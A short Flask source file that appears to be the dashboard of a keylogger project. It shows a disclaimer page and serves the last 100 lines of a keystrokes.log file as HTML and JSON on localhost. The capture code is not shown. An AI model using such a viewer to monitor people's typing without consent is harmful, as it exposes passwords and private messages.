# src/dashboard/app.py
from flask import Flask, render_template, jsonify
import os

app = Flask(__name__)
LOG_FILE = "keystrokes.log"

@app.route('/')
def dashboard():
    """Main dashboard with disclaimer"""
    return render_template('disclaimer.html')

@app.route('/logs')
def view_logs():
    """Display captured keystrokes"""
    if not os.path.exists(LOG_FILE):
        return render_template('dashboard.html', logs=[])
        
    with open(LOG_FILE, 'r') as f:
        logs = f.readlines()
    return render_template('dashboard.html', logs=logs[-100:])  # Last 100 entries

@app.route('/api/logs')
def api_logs():
    """JSON endpoint for log data"""
    if not os.path.exists(LOG_FILE):
        return jsonify({'logs': []})
    with open(LOG_FILE, 'r') as f:
        logs = f.read().splitlines()
    return jsonify({'logs': logs[-100:]})

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=True)
